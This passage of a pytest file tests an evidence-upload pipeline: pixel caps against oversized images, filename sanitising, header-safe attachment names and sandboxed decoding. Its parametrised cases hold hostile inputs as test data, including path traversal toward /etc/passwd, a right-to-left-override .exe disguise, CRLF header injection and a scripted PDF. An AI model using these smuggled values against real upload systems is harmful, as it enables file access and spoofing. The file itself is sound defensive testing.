    assert width * height > MAX_DECODE_PX
    data = _png(mode="1", size=(width, height))
    assert len(data) < MAX_EVIDENCE_BYTES
    with pytest.raises(EvidenceTooLargeError):
        prepare_evidence(data, filename="huge.png")


def test_evidence_pixel_cap_is_below_the_scan_ceilings() -> None:
    """T10 review R2: the re-encode holds several copies, so evidence has its own lower cap.

    A 25 Mpx greyscale PNG fits every scan ceiling (40 Mpx colour, 160 Mpx grey)
    and is refused here, from the header, before any pixel is decoded.
    """
    assert MAX_EVIDENCE_PX < MAX_DECODE_PX < MAX_DECODE_PX_GREY
    width, height = 5000, 5000
    assert MAX_EVIDENCE_PX < width * height < MAX_DECODE_PX
    with pytest.raises(EvidenceTooLargeError) as excinfo:
        prepare_evidence(_png_header(width, height, colour_type=0), filename="grey.png")
    assert excinfo.value.status == 413
    # Just under the cap is not refused for its size: it reaches the decode (no pixels: 415).
    side = int(MAX_EVIDENCE_PX**0.5)
    with pytest.raises(UnsupportedEvidenceError):
        prepare_evidence(_png_header(side, side, colour_type=0), filename="grey.png")


def test_evidence_pixel_cap_follows_the_mode(monkeypatch: pytest.MonkeyPatch) -> None:
    """Per mode (``decode_pixel_cap``): RGBA is held at four bytes a pixel, RGB at three."""
    monkeypatch.setattr(evidence_files, "MAX_EVIDENCE_PX", 10**9)  # only the per-mode cap bites
    width, height = 6000, 5500
    pixels = width * height
    assert decode_pixel_cap("RGBA", "PNG") < pixels < decode_pixel_cap("RGB", "PNG")

    with pytest.raises(EvidenceTooLargeError):
        prepare_evidence(_png_header(width, height, colour_type=6), filename="rgba.png")
    with pytest.raises(UnsupportedEvidenceError):  # under RGB's cap: decoded, and has no pixels
        prepare_evidence(_png_header(width, height, colour_type=2), filename="rgb.png")


def test_reencoded_image_over_the_cap_rejected_413(monkeypatch: pytest.MonkeyPatch) -> None:
    """The stored bytes, not the uploaded ones, must fit the cap (the DB CHECK reads them)."""
    noisy = Image.effect_noise((300, 300), 90).convert("RGB")
    buf = BytesIO()
    noisy.save(buf, "JPEG", quality=20)
    small = buf.getvalue()
    monkeypatch.setattr(evidence_files, "MAX_EVIDENCE_BYTES", len(small))
    with pytest.raises(EvidenceTooLargeError):
        prepare_evidence(small, filename="noise.jpg")


# ---------------------------------------------------------------------------
# Filenames and headers
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("raw", "content_type", "expected"),
    [
        ("degree.pdf", PDF_TYPE, "degree.pdf"),
        ("../../etc/passwd.pdf", PDF_TYPE, "passwd.pdf"),
        ("C:\\Users\\sara\\degree.pdf", PDF_TYPE, "degree.pdf"),
        ("invoice\u202efdp.exe", PNG_TYPE, "invoicefdp.png"),
        ("cert\x00\n\r\t.pdf", PDF_TYPE, "cert.pdf"),
        ("  my   degree .PDF ", PDF_TYPE, "my degree.pdf"),
        ("zero\u200bwidth.pdf", PDF_TYPE, "zerowidth.pdf"),
        ('a"b<c>d|e:f*g?h.pdf', PDF_TYPE, "a_b_c_d_e_f_g_h.pdf"),
        (".hidden.pdf", PDF_TYPE, "hidden.pdf"),
        ("photo.jpeg", JPEG_TYPE, "photo.jpeg"),
        ("photo.JPG", JPEG_TYPE, "photo.jpg"),
        ("scan.pdf", PNG_TYPE, "scan.png"),
        ("notes", PDF_TYPE, "notes.pdf"),
        ("شهادة.pdf", PDF_TYPE, "شهادة.pdf"),
        (None, JPEG_TYPE, "evidence.jpg"),
        ("", PNG_TYPE, "evidence.png"),
        ("...", PDF_TYPE, "evidence.pdf"),
        ("/", PDF_TYPE, "evidence.pdf"),
    ],
)
def test_filename_sanitised(raw: str | None, content_type: str, expected: str) -> None:
    assert sanitise_filename(raw, content_type) == expected


def test_long_filename_truncated_to_column_keeping_extension() -> None:
    name = sanitise_filename("x" * 300 + ".pdf", PDF_TYPE)
    assert len(name) == 200
    assert name.endswith(".pdf")


def test_prepared_filename_is_sanitised() -> None:
    prepared = prepare_evidence(PDF, filename="../a\u202e/cert.exe")
    assert prepared.filename == "cert.pdf"


def test_attachment_disposition_is_header_safe() -> None:
    value = attachment_disposition('شهادة "final"\r\n.pdf')
    assert value.isascii()
    assert "\r" not in value and "\n" not in value
    assert value.startswith('attachment; filename="')
    fallback = value.split('filename="', 1)[1].split('"', 1)[0]
    assert '"' not in fallback and "\\" not in fallback
    assert fallback.endswith(".pdf")
    encoded = value.split("filename*=UTF-8''", 1)[1]
    assert unquote(encoded) == 'شهادة "final"\r\n.pdf'


def test_attachment_disposition_ascii_name_round_trips() -> None:
    assert attachment_disposition("degree.pdf") == (
        "attachment; filename=\"degree.pdf\"; filename*=UTF-8''degree.pdf"
    )


def test_evidence_object_path_shape() -> None:
    profile, evidence = uuid.uuid4(), uuid.uuid4()
    assert evidence_object_path(profile, evidence, PDF_TYPE) == (
        f"tutor-evidence/{profile}/{evidence}.pdf"
    )
    assert evidence_object_path(profile, evidence, JPEG_TYPE).endswith(f"/{evidence}.jpg")
    assert evidence_object_path(profile, evidence, PNG_TYPE).endswith(f"/{evidence}.png")


# ---------------------------------------------------------------------------
# The worker (T10 review R2): decode and MuPDF work leave the web process
# ---------------------------------------------------------------------------


def test_the_worker_target_is_prepare_evidence() -> None:
    module, _, name = EVIDENCE_PREPARE_TARGET.rpartition(".")
    assert module == evidence_files.__name__
    assert getattr(evidence_files, name) is prepare_evidence


@pytest.mark.parametrize(
    "error", [UnsupportedEvidenceError("Upload a PDF."), EvidenceTooLargeError("Too big.")]
)
def test_a_refusal_pickles_with_its_status_code_and_message(
    error: UnsupportedEvidenceError | EvidenceTooLargeError,
) -> None:
    """The worker sends a ``LemelyError`` back pickled; the route reads ``status`` and ``code``."""
    copy = pickle.loads(pickle.dumps(error))  # noqa: S301 - our own bytes
    assert type(copy) is type(error)
    assert (copy.status, copy.code, copy.message) == (error.status, error.code, error.message)


@pytest.mark.usefixtures("sandboxed")
def test_prepare_evidence_runs_in_the_extraction_worker() -> None:
    jpeg = _jpeg(exif=_exif(orientation=6))

    prepared = prepare_evidence_in_worker(
        jpeg, filename="photo.jpg", declared_type=JPEG_TYPE, timeout=20.0
    )

    child = sandbox.EXTRACTION_WORKER.pid()
    assert child is not None
    assert child != os.getpid()
    assert sandbox.EXTRACTION_WORKER.last_outcome == "ok"
    assert prepared.content_type == JPEG_TYPE
    assert _open(prepared.data).size == (30, 40)
    assert b"SpyCam" not in prepared.data


@pytest.mark.parametrize(
    ("data", "error", "status"),
    [
        (b"GIF89a\x01\x00\x01\x00\x00\x00\x00;", UnsupportedEvidenceError, 415),
        (_png_header(6000, 6000, colour_type=0), EvidenceTooLargeError, 413),
        (pdf_with_scripted_widget(), UnsupportedEvidenceError, 415),
    ],
    ids=["gif", "pixels", "pdf-script"],
)
@pytest.mark.usefixtures("sandboxed")
def test_a_refusal_in_the_worker_reaches_the_caller_intact(
    data: bytes, error: type[Exception], status: int
) -> None:
    with pytest.raises(error) as excinfo:
        prepare_evidence_in_worker(data, filename="x", declared_type=None, timeout=20.0)
    assert getattr(excinfo.value, "status", None) == status
    assert sandbox.EXTRACTION_WORKER.last_outcome == "rejected"


def test_an_oversize_upload_is_refused_before_the_worker(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Over 10 MiB never crosses the pipe: refused in the web process."""
    called: list[str] = []

    def call(target: str, *args: object, **kwargs: object) -> object:
        called.append(target)
        raise AssertionError("the worker was called")

    monkeypatch.setattr(sandbox.EXTRACTION_WORKER, "call", call)
    with pytest.raises(EvidenceTooLargeError):
        prepare_evidence_in_worker(
            PDF + b"\x00" * MAX_EVIDENCE_BYTES, filename="x.pdf", declared_type=None, timeout=20.0
        )
    assert called == []
